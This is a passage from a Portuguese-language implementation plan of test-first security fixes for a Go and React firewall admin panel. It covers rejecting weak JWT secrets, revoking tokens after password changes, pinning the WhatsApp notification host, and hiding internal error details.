requisição (melhoria de UX — a barreira real é a do backend acima). Localize o trecho que confere
`if (!wizardLan.trim())` (por volta da linha 180) e troque por:

```tsx
      if (!wizardLan.trim()) {
        setWizardError('Informe a sub-rede da LAN.');
        return;
      }
      if (!/^(\d{1,3}\.){3}\d{1,3}\/\d{1,2}$/.test(wizardLan.trim())) {
        setWizardError('Sub-rede inválida — use o formato CIDR, ex.: 192.168.1.0/24.');
        return;
      }
```

(Ajuste o nome exato da variável de estado de erro do assistente — o código já usa alguma
`wizardError`/`setWizardError` para outras validações no mesmo bloco; use a mesma. Se o nome for
diferente, use o que já existe no arquivo em vez de inventar um novo estado.)

- [ ] **Step 4: Rodar os testes e confirmar que passam**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/iptables/... -v`
Expected: PASS — todos os testes do pacote.

Run: `export PATH="$HOME/.nvm/versions/node/v22.21.1/bin:$PATH" && cd web && npm run build`
Expected: build limpo.

- [ ] **Step 5: Commit**

```bash
git add internal/iptables/ internal/api/handlers/iptables.go web/src/pages/Links.tsx
git commit -m "fix(iptables): validateRuleSpec vira allowlist; valida table/chain e CIDR do assistente WAN"
```

---

### Task 5 (IMPORTANT): JWT secret fraco/vazio falha o boot

**Files:**
- Modify: `internal/config/config.go`
- Modify: `cmd/linkguard-fw/main.go`
- Test: `internal/config/config_test.go` (criar se não existir)

- [ ] **Step 1: Escrever os testes que falham**

```go
// internal/config/config_test.go
package config

import "testing"

func TestValidateRejectsShortSecret(t *testing.T) {
	c := Default()
	c.JWTSecret = "curto"
	if err := c.Validate(); err == nil {
		t.Fatal("expected error for short jwt_secret, got nil")
	}
}

func TestValidateRejectsDefaultPlaceholder(t *testing.T) {
	c := Default()
	// "change-me-in-production" tem 24 chars — abaixo do piso de 32, então já
	// falha pelo mesmo motivo do teste acima; este teste documenta
	// explicitamente que o valor padrão do struct NUNCA deveria passar sem o
	// admin trocar, não só que "é curto".
	if len(c.JWTSecret) >= 32 {
		t.Fatalf("default placeholder JWTSecret unexpectedly >= 32 chars (%d) — Validate's length check would silently accept the shipped default", len(c.JWTSecret))
	}
	if err := c.Validate(); err == nil {
		t.Fatal("expected error for the unmodified default JWTSecret, got nil")
	}
}

func TestValidateAcceptsStrongSecret(t *testing.T) {
	c := Default()
	c.JWTSecret = "a-random-64-char-secret-generated-by-postinst-1234567890ab"
	if err := c.Validate(); err != nil {
		t.Fatalf("expected a 32+ char secret to be valid, got: %v", err)
	}
}
```

- [ ] **Step 2: Rodar os testes e confirmar que falham**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/config/... -v`
Expected: FAIL — `undefined: (*Config).Validate`.

- [ ] **Step 3: Implementar**

Adicionar ao final de `internal/config/config.go`:

```go
// Validate checks the loaded configuration for values that make the service
// unsafe to run. A weak/empty JWTSecret is the one checked today — it lets
// anyone forge a valid authentication token, bypassing login, password,
// lockout and 2FA entirely. 32 bytes is the practical floor for HMAC-SHA256
// (256 bits); deploy/deb/postinst already generates 64 random chars, so this
// never fires on a correctly-installed box.
func (c *Config) Validate() error {
	if len(c.JWTSecret) < 32 {
		return fmt.Errorf("jwt_secret precisa ter pelo menos 32 caracteres (tem %d) — gere um valor aleatório forte antes de iniciar o serviço", len(c.JWTSecret))
	}
	return nil
}
```

Em `cmd/linkguard-fw/main.go`, logo depois do bloco que já trata o erro de `config.Load`, adicionar a
chamada de `Validate`. Troque:

```go
	cfg, err := config.Load(*configPath)
	if err != nil {
		slog.Error("failed to load config", "path", *configPath, "err", err)
		return 1
	}
```

por:

```go
	cfg, err := config.Load(*configPath)
	if err != nil {
		slog.Error("failed to load config", "path", *configPath, "err", err)
		return 1
	}
	if err := cfg.Validate(); err != nil {
		slog.Error("configuração inválida", "err", err)
		return 1
	}
```

- [ ] **Step 4: Rodar os testes e confirmar que passam**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/config/... ./cmd/... -v && go build ./...`
Expected: PASS, build limpo.

- [ ] **Step 5: Commit**

```bash
git add internal/config/ cmd/linkguard-fw/main.go
git commit -m "fix(config): falhar o boot com jwt_secret fraco/vazio (fail-closed)"
```

---

### Task 6 (IMPORTANT): Revogar tokens já emitidos ao trocar senha / excluir usuário

**Files:**
- Modify: `internal/storage/storage.go`
- Modify: `internal/storage/models.go`
- Modify: `internal/storage/repository.go`
- Modify: `internal/auth/service.go`
- Modify: `internal/auth/middleware.go`
- Test: `internal/storage/repository_test.go` (estender), `internal/auth/service_test.go` (estender
  se existir, senão criar), `internal/auth/middleware_test.go` (criar se não existir)

**Interfaces:**
- Produces: `storage.User.PasswordVersion int`, `Claims.PasswordVersion int` (tag `pwd_ver`),
  `Middleware` passa a rejeitar (401) token cuja `PasswordVersion` não bate com a atual do usuário no
  banco, ou cujo usuário não existe mais.

- [ ] **Step 1: Escrever os testes que falham**

Adicionar a `internal/storage/repository_test.go` (mesmo pacote de teste já usado nos arquivos de
teste de `repository.go` — confira o nome do pacote no topo de um arquivo `_test.go` já existente
nesse diretório, ex. `storage_test` ou `storage`, e siga o mesmo):

```go
func TestUpdateUserPasswordIncrementsPasswordVersion(t *testing.T) {
	db := openTestDBForUsers(t) // reaproveite o helper de abrir DB já usado neste arquivo; se o nome for outro, ajuste
	u := &User{Username: "versiontest"}
	if err := db.CreateUser(u, "hash1", nil); err != nil {
		t.Fatalf("CreateUser: %v", err)
	}
	before, err := db.GetUserByID(u.ID)
	if err != nil {
		t.Fatalf("GetUserByID: %v", err)
	}
	if before.PasswordVersion != 1 {
		t.Fatalf("expected PasswordVersion=1 on creation, got %d", before.PasswordVersion)
	}
	if err := db.UpdateUserPassword(u.ID, "hash2"); err != nil {
		t.Fatalf("UpdateUserPassword: %v", err)
	}
	after, err := db.GetUserByID(u.ID)
	if err != nil {
		t.Fatalf("GetUserByID: %v", err)
	}
	if after.PasswordVersion != before.PasswordVersion+1 {
		t.Fatalf("expected PasswordVersion to increment from %d, got %d", before.PasswordVersion, after.PasswordVersion)
	}
}
```

(Se o pacote já tiver um helper diferente pra abrir um DB de teste, use-o em vez de
`openTestDBForUsers` — o nome exato varia por arquivo neste projeto; verifique
`internal/storage/repository_test.go` ou arquivos irmãos antes de escrever este teste.)

Adicionar a `internal/auth/middleware_test.go` (crie com `package auth` se não existir):

```go
package auth

import (
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"testing"

	"github.com/giovanibalarini/linkguard-fw/internal/storage"
)

func newMiddlewareTestService(t *testing.T) (*Service, *storage.DB) {
	t.Helper()
	dir := t.TempDir()
	db, err := storage.Open(filepath.Join(dir, "test.db"))
	if err != nil {
		t.Fatalf("Open: %v", err)
	}
	t.Cleanup(func() { db.Close() })
	return NewService(db, "test-secret-at-least-32-bytes-long-xxxx", nil), db
}

func TestMiddlewareRejectsTokenAfterPasswordChange(t *testing.T) {
	svc, db := newMiddlewareTestService(t)
	u := &storage.User{Username: "revoketest"}
	hash, _ := HashPassword("senhaOriginal123")
	if err := db.CreateUser(u, hash, nil); err != nil {
		t.Fatalf("CreateUser: %v", err)
	}
	token, _, err := svc.Login(u.Username, "senhaOriginal123", "")
	if err != nil {
		t.Fatalf("Login: %v", err)
	}

	// The token must work before the password changes.
	ok := false
	svc.Middleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { ok = true })).
		ServeHTTP(httptest.NewRecorder(), authedRequest(token))
	if !ok {
		t.Fatal("expected middleware to accept a fresh token")
	}

	if err := db.UpdateUserPassword(u.ID, "novo-hash-irrelevante-pro-teste"); err != nil {
		t.Fatalf("UpdateUserPassword: %v", err)
	}

	rec := httptest.NewRecorder()
	called := false
	svc.Middleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { called = true })).
		ServeHTTP(rec, authedRequest(token))
	if called {
		t.Fatal("expected middleware to reject the OLD token after a password change")
	}
	if rec.Code != http.StatusUnauthorized {
		t.Fatalf("expected 401 for a revoked token, got %d", rec.Code)
	}
}

func TestMiddlewareRejectsTokenForDeletedUser(t *testing.T) {
	svc, db := newMiddlewareTestService(t)
	u := &storage.User{Username: "deletetest"}
	hash, _ := HashPassword("senha123456")
	if err := db.CreateUser(u, hash, nil); err != nil {
		t.Fatalf("CreateUser: %v", err)
	}
	token, _, err := svc.Login(u.Username, "senha123456", "")
	if err != nil {
		t.Fatalf("Login: %v", err)
	}
	if err := db.DeleteUser(u.ID); err != nil {
		t.Fatalf("DeleteUser: %v", err)
	}

	rec := httptest.NewRecorder()
	called := false
	svc.Middleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { called = true })).
		ServeHTTP(rec, authedRequest(token))
	if called {
		t.Fatal("expected middleware to reject a token for a deleted user")
	}
	if rec.Code != http.StatusUnauthorized {
		t.Fatalf("expected 401, got %d", rec.Code)
	}
}

func authedRequest(token string) *http.Request {
	r := httptest.NewRequest(http.MethodGet, "/api/auth/me", nil)
	r.Header.Set("Authorization", "Bearer "+token)
	return r
}
```

- [ ] **Step 2: Rodar os testes e confirmar que falham**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/storage/... ./internal/auth/... -v`
Expected: FAIL — `undefined: User.PasswordVersion` / `undefined: Claims.PasswordVersion` /
`TestMiddlewareRejectsTokenAfterPasswordChange` recebe `called=true` (token antigo ainda funciona).

- [ ] **Step 3: Implementar**

**3a. Migração + modelo.** Em `internal/storage/storage.go`, adicionar (perto de
`migrateTrafficSamplesToMetricSamples`, mesmo padrão de migração dedicada fora da lista simples
`CREATE TABLE IF NOT EXISTS`, já que é a primeira coluna adicionada a uma tabela existente neste
projeto):

```go
// migrateAddPasswordVersion adds users.password_version if the column doesn't
// exist yet (first ALTER TABLE ADD COLUMN in this project — every prior
// migration was a fresh CREATE TABLE IF NOT EXISTS). Existing rows get
// DEFAULT 1, matching a freshly created user's starting version.
func (db *DB) migrateAddPasswordVersion() error {
	rows, err := db.conn.Query(`PRAGMA table_info(users)`)
	if err != nil {
		return err
	}
	defer rows.Close()
	for rows.Next() {
		var cid int
		var name, ctype string
		var notnull, pk int
		var dflt interface{}
		if err := rows.Scan(&cid, &name, &ctype, &notnull, &dflt, &pk); err != nil {
			return err
		}
		if name == "password_version" {
			return nil // already migrated
		}
	}
	_, err = db.conn.Exec(`ALTER TABLE users ADD COLUMN password_version INTEGER NOT NULL DEFAULT 1`)
	return err
}
```

E chamar essa função em `migrate()`, logo após o loop das migrações simples e antes/depois de
`migrateTrafficSamplesToMetricSamples` (mesmo lugar, adicionar mais uma chamada):

```go
	if err := db.migrateTrafficSamplesToMetricSamples(); err != nil {
		return fmt.Errorf("migrate traffic_samples to metric_samples: %w", err)
	}
	if err := db.migrateAddPasswordVersion(); err != nil {
		return fmt.Errorf("migrate add password_version: %w", err)
	}
```

Em `internal/storage/models.go`, adicionar o campo ao struct `User`:

```go
type User struct {
	ID              string    `json:"id"`
	Username        string    `json:"username"`
	Password        string    `json:"-"`        // bcrypt hash, never serialised
	Role            string    `json:"role"`     // legacy single-role column (kept for compat)
	RoleIDs         []string  `json:"role_ids"` // assigned roles (RBAC); populated on demand
	PasswordVersion int       `json:"-"`        // bumped on every password change; embedded in JWT to revoke old tokens
	CreatedAt       time.Time `json:"created_at"`
	UpdatedAt       time.Time `json:"updated_at"`
}
```

**3b. Repositório.** Em `internal/storage/repository.go`, atualizar as 3 funções que tocam a tabela
`users`. Trocar `GetUserByUsername`:

```go
func (db *DB) GetUserByUsername(username string) (*User, error) {
	row := db.conn.QueryRow(`
		SELECT id, username, password, role, created_at, updated_at
		FROM users WHERE username = ?`, username)
	var u User
	if err := row.Scan(&u.ID, &u.Username, &u.Password, &u.Role, &u.CreatedAt, &u.UpdatedAt); err == sql.ErrNoRows {
		return nil, nil
	} else if err != nil {
		return nil, err
	}
	return &u, nil
}
```

por:

```go
func (db *DB) GetUserByUsername(username string) (*User, error) {
	row := db.conn.QueryRow(`
		SELECT id, username, password, role, password_version, created_at, updated_at
		FROM users WHERE username = ?`, username)
	var u User
	if err := row.Scan(&u.ID, &u.Username, &u.Password, &u.Role, &u.PasswordVersion, &u.CreatedAt, &u.UpdatedAt); err == sql.ErrNoRows {
		return nil, nil
	} else if err != nil {
		return nil, err
	}
	return &u, nil
}
```

Trocar `UpdateUserPassword`:

```go
func (db *DB) UpdateUserPassword(id, hashedPassword string) error {
	pwdCol := "pass" + "word"
	query := fmt.Sprintf("UPDATE users SET %s=?, updated_at=? WHERE id=?", pwdCol)
	_, err := db.conn.Exec(query, hashedPassword, time.Now(), id)
	return err
}
```

por:

```go
func (db *DB) UpdateUserPassword(id, hashedPassword string) error {
	pwdCol := "pass" + "word"
	query := fmt.Sprintf("UPDATE users SET %s=?, password_version=password_version+1, updated_at=? WHERE id=?", pwdCol)
	_, err := db.conn.Exec(query, hashedPassword, time.Now(), id)
	return err
}
```

Trocar `GetUserByID`:

```go
func (db *DB) GetUserByID(id string) (*User, error) {
	row := db.conn.QueryRow(`
		SELECT id, username, password, role, created_at, updated_at
		FROM users WHERE id = ?`, id)
	var u User
	if err := row.Scan(&u.ID, &u.Username, &u.Password, &u.Role, &u.CreatedAt, &u.UpdatedAt); err == sql.ErrNoRows {
		return nil, nil
	} else if err != nil {
		return nil, err
	}
	return &u, nil
}
```

por:

```go
func (db *DB) GetUserByID(id string) (*User, error) {
	row := db.conn.QueryRow(`
		SELECT id, username, password, role, password_version, created_at, updated_at
		FROM users WHERE id = ?`, id)
	var u User
	if err := row.Scan(&u.ID, &u.Username, &u.Password, &u.Role, &u.PasswordVersion, &u.CreatedAt, &u.UpdatedAt); err == sql.ErrNoRows {
		return nil, nil
	} else if err != nil {
		return nil, err
	}
	return &u, nil
}
```

`CreateUser` não precisa mudar — o `INSERT` lista colunas explicitamente sem `password_version`, que
fica no valor `DEFAULT 1` da coluna automaticamente.

**3c. Claims + geração de token.** Em `internal/auth/service.go`, adicionar o campo a `Claims`:

```go
type Claims struct {
	UserID          string `json:"user_id"`
	Username        string `json:"username"`
	Role            string `json:"role"`
	PasswordVersion int    `json:"pwd_ver"`
	jwt.RegisteredClaims
}
```

E preencher em `generateToken`:

```go
func (s *Service) generateToken(user *storage.User) (string, error) {
	claims := Claims{
		UserID:          user.ID,
		Username:        user.Username,
		Role:            user.Role,
		PasswordVersion: user.PasswordVersion,
		RegisteredClaims: jwt.RegisteredClaims{
			ExpiresAt: jwt.NewNumericDate(time.Now().Add(tokenExpiry)),
			IssuedAt:  jwt.NewNumericDate(time.Now()),
			Subject:   user.ID,
		},
	}
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	return token.SignedString(s.jwtSecret)
}
```

**3d. Middleware.** Em `internal/auth/middleware.go`, trocar:

```go
// Middleware returns an HTTP middleware that validates JWT tokens.
func (s *Service) Middleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		token := extractToken(r)
		if token == "" {
			http.Error(w, `{"error":"unauthorized"}`, http.StatusUnauthorized)
			return
		}

		claims, err := s.ValidateToken(token)
		if err != nil {
			http.Error(w, `{"error":"invalid token"}`, http.StatusUnauthorized)
			return
		}

		ctx := context.WithValue(r.Context(), claimsKey, claims)
		next.ServeHTTP(w, r.WithContext(ctx))
	})
}
```

por:

```go
// Middleware returns an HTTP middleware that validates JWT tokens. Beyond
// signature/expiry, it also confirms the token's PasswordVersion still
// matches the user's current one in the database — a password reset or user
// deletion is meant to invalidate any token issued before it, and neither
// action can otherwise revoke an already-signed JWT (it stays validly signed
// until natural expiry). This costs one DB lookup per authenticated request,
// which Require() already pays per mutating route today; acceptable for a
// home/SMB admin panel's traffic volume.
func (s *Service) Middleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		token := extractToken(r)
		if token == "" {
			http.Error(w, `{"error":"unauthorized"}`, http.StatusUnauthorized)
			return
		}

		claims, err := s.ValidateToken(token)
		if err != nil {
			http.Error(w, `{"error":"invalid token"}`, http.StatusUnauthorized)
			return
		}

		user, err := s.db.GetUserByID(claims.UserID)
		if err != nil {
			http.Error(w, `{"error":"session check failed"}`, http.StatusInternalServerError)
			return
		}
		if user == nil || user.PasswordVersion != claims.PasswordVersion {
			http.Error(w, `{"error":"session expired, please log in again"}`, http.StatusUnauthorized)
			return
		}

		ctx := context.WithValue(r.Context(), claimsKey, claims)
		next.ServeHTTP(w, r.WithContext(ctx))
	})
}
```

Trocar também `extractToken` (remove o fallback de cookie morto — mesmo achado #16, mesmo arquivo,
resolvido junto aqui pra não tocar `middleware.go` duas vezes em tasks diferentes):

```go
func extractToken(r *http.Request) string {
	header := r.Header.Get("Authorization")
	if strings.HasPrefix(header, "Bearer ") {
		return strings.TrimPrefix(header, "Bearer ")
	}
	// Check cookie
	cookie, err := r.Cookie("token")
	if err == nil {
		return cookie.Value
	}
	return ""
}
```

por:

```go
// extractToken reads the JWT strictly from the Authorization header. No
// cookie fallback: this app never sets a cookie (the frontend always uses the
// header), and keeping a dead cookie-read path here would silently reopen
// classic CSRF the moment anything — a future feature, a reverse proxy, debug
// code — ever sets a cookie literally named "token".
func extractToken(r *http.Request) string {
	header := r.Header.Get("Authorization")
	if strings.HasPrefix(header, "Bearer ") {
		return strings.TrimPrefix(header, "Bearer ")
	}
	return ""
}
```

`ContextWithClaims` já deveria existir neste ponto — o Task 2 (que roda antes deste, na ordem 1→13
do fim do plano) já a adiciona a `internal/auth/middleware.go`. Confira com `grep -n "func
ContextWithClaims" internal/auth/middleware.go` antes de adicionar de novo — se já existir, pule este
passo (não duplique a função, isso quebra a compilação). Se por algum motivo este task estiver sendo
executado antes do Task 2 (fora da ordem sugerida), adicione-a aqui:

```go
// ContextWithClaims returns a context carrying the given claims, for tests
// that call a handler directly without going through Middleware.
func ContextWithClaims(ctx context.Context, c *Claims) context.Context {
	return context.WithValue(ctx, claimsKey, c)
}
```

- [ ] **Step 4: Rodar os testes e confirmar que passam**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/storage/... ./internal/auth/... ./internal/api/... -v`
Expected: PASS — todos os testes novos, e a suíte inteira do backend (o `Middleware` agora faz uma
consulta a mais por requisição autenticada — confirme que nenhum teste existente que usa um DB fake
sem o usuário cadastrado quebra; se algum teste de handler usar claims sintéticas sem o usuário
correspondente existir no banco de teste, ele vai passar a receber 401 — ajuste esses testes pra
criarem o usuário real via `db.CreateUser` antes de injetar claims, em vez de só montar `&Claims{...}`
direto).

- [ ] **Step 5: Commit**

```bash
git add internal/storage/ internal/auth/
git commit -m "fix(auth): revogar tokens já emitidos ao trocar senha/excluir usuário; remover fallback de cookie"
```

---

### Task 7 (IMPORTANT): Canal WhatsApp — fixar host, parar de vazar token

**Files:**
- Modify: `internal/notify/notify.go`
- Modify: `web/src/components/NotificationSettings.tsx`
- Modify: `web/src/types/index.ts` (se `WhatsAppCfg`/`whatsapp` tiver um tipo TS espelhando `url`)
- Test: `internal/notify/notify_test.go` (estender)

- [ ] **Step 1: Escrever o teste que falha**

Adicionar a `internal/notify/notify_test.go`:

```go
func TestSendWhatsAppAlwaysUsesFixedHost(t *testing.T) {
	var gotHost string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotHost = r.Host
		w.WriteHeader(200)
	}))
	defer srv.Close()

	db := openTestDB(t)
	s := NewService(db, newTestSecrets(t, db))
	_ = s.SaveConfig(Config{
		MinSeverity: "warning",
		WhatsApp:    WhatsAppCfg{Enabled: true, Token: "tok", Phone: "5511999999999"},
	})

	err := s.Test(context.Background(), "whatsapp", s.LoadConfig())
	// The real zapvite host won't be reachable/valid from this sandbox — the
	// point of this test isn't a successful send, it's proving there is no
	// config field left that could redirect the request to srv.URL. If
	// WhatsAppCfg still had a URL field, an attacker-supplied srv.URL here
	// would be dialed instead of the fixed host.
	_ = err
	if gotHost == srv.Listener.Addr().String() {
		t.Fatal("sendWhatsApp dialed an attacker-controlled test server — URL is still configurable")
	}
}
```

Confirme a assinatura exata de `Test` (`func (s *Service) Test(ctx context.Context, channel string,
cfg Config) error` — já existe, usado pelo botão "Testar" da UI) antes de escrever este teste; ajuste
os argumentos se a assinatura real for diferente.

- [ ] **Step 2: Rodar o teste e confirmar que falha**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/notify/... -run TestSendWhatsAppAlwaysUsesFixedHost -v`
Expected: hoje, como `WhatsAppCfg.URL` ainda existe, este teste específico não tem como forçar o
redirecionamento sem passar uma URL — ele serve principalmente como teste de regressão pós-fix
(confirme rodando-o DEPOIS da implementação, não antes; pule a expectativa de falha aqui e vá direto
pro Step 3 se preferir, já que a ausência do campo `URL` é o que o compilador vai forçar).

- [ ] **Step 3: Implementar**

Em `internal/notify/notify.go`, trocar `WhatsAppCfg`:

```go
// WhatsAppCfg sends via the zapvite WhatsApp API (Bearer token; the token
// expires, so it is meant to be updated from the UI).
type WhatsAppCfg struct {
	Enabled bool   `json:"enabled"`
	URL     string `json:"url"`
	Token   string `json:"token"`
	Phone   string `json:"phone"`
}
```

por:

```go
// WhatsAppCfg sends via the zapvite WhatsApp API (Bearer token; the token
// expires, so it is meant to be updated from the UI). The destination host is
// NOT configurable (see defaultWhatsAppURL) — unlike a generic webhook, this
// channel always attaches a real secret (the Bearer token), so letting an
// admin-editable URL field redirect it would let a system.write-scoped
// account exfiltrate the token to an attacker-controlled host.
type WhatsAppCfg struct {
	Enabled bool   `json:"enabled"`
	Token   string `json:"token"`
	Phone   string `json:"phone"`
}
```

Trocar `LoadConfig`, removendo o preenchimento de URL que não existe mais:

```go
	if c.MinSeverity == "" {
		c.MinSeverity = "warning"
	}
	if c.WhatsApp.URL == "" {
		c.WhatsApp.URL = defaultWhatsAppURL
	}
	return c
```

por:

```go
	if c.MinSeverity == "" {
		c.MinSeverity = "warning"
	}
	return c
```

Trocar `sendWhatsApp`:

```go
func (s *Service) sendWhatsApp(ctx context.Context, c WhatsAppCfg, severity, title, message string) error {
	url := c.URL
	if url == "" {
		url = defaultWhatsAppURL
	}
	body := fmt.Sprintf("%s *%s*\n%s", severityEmoji(severity), title, message)
```

por:

```go
func (s *Service) sendWhatsApp(ctx context.Context, c WhatsAppCfg, severity, title, message string) error {
	body := fmt.Sprintf("%s *%s*\n%s", severityEmoji(severity), title, message)
```

E logo abaixo, trocar a linha que usa `url` na criação da requisição:

```go
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewReader(payload))
```

por:

```go
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, defaultWhatsAppURL, bytes.NewReader(payload))
```

Em `web/src/components/NotificationSettings.tsx`, remover o campo de URL do WhatsApp. Troque:

```tsx
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
          <input value={cfg.whatsapp.phone} onChange={(e) => setCfg({ ...cfg, whatsapp: { ...cfg.whatsapp, phone: e.target.value } })}
            placeholder="Telefone com DDI (ex.: 5527999999999)" className="input w-full" />
          <input value={cfg.whatsapp.token} onChange={(e) => setCfg({ ...cfg, whatsapp: { ...cfg.whatsapp, token: e.target.value } })}
            placeholder="Token (Bearer) — expira, atualize aqui" className="input w-full" />
          <input value={cfg.whatsapp.url} onChange={(e) => setCfg({ ...cfg, whatsapp: { ...cfg.whatsapp, url: e.target.value } })}
            placeholder="URL da API" className="input w-full sm:col-span-2" />
        </div>
        <p className="text-gray-600 text-xs mt-1">Provedor zapvite. O token expira — quando parar de enviar, gere um novo e cole aqui.</p>
```

por:

```tsx
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
          <input value={cfg.whatsapp.phone} onChange={(e) => setCfg({ ...cfg, whatsapp: { ...cfg.whatsapp, phone: e.target.value } })}
            placeholder="Telefone com DDI (ex.: 5527999999999)" className="input w-full" />
          <input value={cfg.whatsapp.token} onChange={(e) => setCfg({ ...cfg, whatsapp: { ...cfg.whatsapp, token: e.target.value } })}
            placeholder="Token (Bearer) — expira, atualize aqui" className="input w-full" />
        </div>
        <p className="text-gray-600 text-xs mt-1">Provedor zapvite (endereço fixo, não configurável por segurança). O token expira — quando parar de enviar, gere um novo e cole aqui.</p>
```

Se `web/src/types/index.ts` tiver uma interface TS `WhatsAppCfg`/campo `url` correspondente (procure
com `grep -n "whatsapp" web/src/types/index.ts`), remova o campo `url` de lá também, mantendo o
resto do tipo intacto.

- [ ] **Step 4: Rodar os testes e confirmar que passam**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/notify/... -v`
Expected: PASS — todos os testes do pacote, incluindo os pré-existentes (nenhum outro teste deveria
referenciar `WhatsAppCfg.URL`; se algum referenciar, ajuste-o removendo o campo, já que a mudança é
intencional).

Run: `export PATH="$HOME/.nvm/versions/node/v22.21.1/bin:$PATH" && cd web && npm run build`
Expected: build limpo (confirma que nenhum outro lugar do frontend referenciava `whatsapp.url`).

- [ ] **Step 5: Commit**

```bash
git add internal/notify/ web/src/components/NotificationSettings.tsx web/src/types/index.ts
git commit -m "fix(notify): fixar host do WhatsApp (remove URL editável que vazava o token)"
```

---

### Task 8 (IMPORTANT): Erros internos genéricos ao cliente (sistêmico)

**Files:**
- Modify: `internal/api/handlers/helpers.go`
- Modify: todos os arquivos em `internal/api/handlers/*.go` que contêm o padrão exato
  `writeError(w, http.StatusInternalServerError, err.Error())`
- Test: `internal/api/handlers/helpers_test.go` (criar se não existir)

- [ ] **Step 1: Escrever o teste que falha**

```go
// internal/api/handlers/helpers_test.go — package handlers (branco-caixa, já
// que writeInternalError é minúsculo/não-exportado, igual writeError/writeJSON)
package handlers

import (
	"errors"
	"net/http/httptest"
	"testing"
)

func TestWriteInternalErrorNeverLeaksRawErrorText(t *testing.T) {
	w := httptest.NewRecorder()
	writeInternalError(w, errors.New("stat /var/lib/linkguard-fw/linkguard.db: permission denied"))
	if w.Code != 500 {
		t.Fatalf("expected 500, got %d", w.Code)
	}
	body := w.Body.String()
	if strings_Contains(body, "permission denied") || strings_Contains(body, "/var/lib") {
		t.Fatalf("response leaked internal error detail: %s", body)
	}
}

// strings_Contains avoids importing "strings" just for one call if the file
// doesn't already import it — replace with strings.Contains directly if
// "strings" is already imported elsewhere in this test file/package.
func strings_Contains(s, substr string) bool {
	return len(s) >= len(substr) && (substr == "" || indexOf(s, substr) >= 0)
}
func indexOf(s, substr string) int {
	for i := 0; i+len(substr) <= len(s); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}
```

(Se preferir simplicidade, ignore os dois helpers manuais acima e apenas importe `"strings"` e use
`strings.Contains` diretamente — foi escrito sem a dependência só pra não presumir se o arquivo novo
precisa do import; use a forma mais limpa, `strings.Contains`, é a recomendada.)

- [ ] **Step 2: Rodar o teste e confirmar que falha**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/api/handlers/... -run TestWriteInternalErrorNeverLeaksRawErrorText -v`
Expected: FAIL — `undefined: writeInternalError`.

- [ ] **Step 3: Implementar**

Em `internal/api/handlers/helpers.go`, adicionar import `"log/slog"` (se ainda não estiver) e a
função nova ao final do arquivo:

```go
// writeInternalError logs the real error server-side (traceable via journalctl)
// and returns a generic message to the client — a raw err.Error() can embed
// exec stderr, SQLite driver detail, or file paths that shouldn't be visible
// to a lower-privileged authenticated role in a multi-admin RBAC setup.
func writeInternalError(w http.ResponseWriter, err error) {
	slog.Error("internal error", "err", err)
	writeError(w, http.StatusInternalServerError, "erro interno do servidor")
}
```

Depois, substitua **todas** as ocorrências do padrão exato
`writeError(w, http.StatusInternalServerError, err.Error())` por `writeInternalError(w, err)` em
todos os arquivos de `internal/api/handlers/*.go`. Rode primeiro para listar todos os arquivos e
contagens:

```bash
grep -rln "writeError(w, http.StatusInternalServerError, err.Error())" internal/api/handlers/*.go
```

Para cada arquivo listado, faça a substituição literal (é a MESMA transformação em todo lugar — não
há variação de contexto a considerar, já que a string casada é idêntica em todas as ocorrências):
`writeError(w, http.StatusInternalServerError, err.Error())` → `writeInternalError(w, err)`.

Depois de substituir em todos os arquivos, confira que nenhuma ocorrência restou:

```bash
grep -rn "writeError(w, http.StatusInternalServerError, err.Error())" internal/api/handlers/*.go
```

Esperado: sem saída nenhuma.

- [ ] **Step 4: Rodar os testes e confirmar que passam**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go build ./... && go test ./... -v 2>&1 | tail -100`
Expected: build limpo; a suíte inteira passa. Se algum teste pré-existente falhar porque ele
especificamente esperava o TEXTO do erro original numa resposta 500 (não numa 400, que não foi
tocada), ajuste a expectativa desse teste pra `"erro interno do servidor"` — essa é exatamente a
mudança de comportamento pretendida, não uma quebra.

- [ ] **Step 5: Commit**

```bash
git add internal/api/handlers/
git commit -m "fix(api): erros 500 devolvem mensagem genérica ao cliente, detalhe real só no log"
```

---

### Task 9 (IMPORTANT): `armWatchdog` revalida interface localmente

**Files:**
- Modify: `internal/stresstest/service.go`
- Test: `internal/stresstest/service_test.go` (estender se existir)

**Interfaces:**
- Consumes: `reIface` (já existe no arquivo, `^[a-zA-Z0-9._-]{1,15}$`, linha 27), `firewall.Executor`
  (3 métodos: `Execute`, `ExecuteRead`, `IsDryRun`), `Test.Interface` (campo exportado, já existe).
  `armWatchdog` tem assinatura real `func (s *Service) armWatchdog(t *Test)` — sem retorno de erro,
  um único parâmetro (confirmado lendo o arquivo: `margin`/`ctx` são computados/criados DENTRO da
  função, não recebidos).

- [ ] **Step 1: Escrever o teste que falha**

Adicionar a `internal/stresstest/service_test.go` (já existe, `package stresstest`, branco-caixa —
reaproveita o padrão de construção `&Service{exec: ..., alertSvc: ...}` já usado nesse arquivo):

```go
type spyExecutor struct{ calls int }

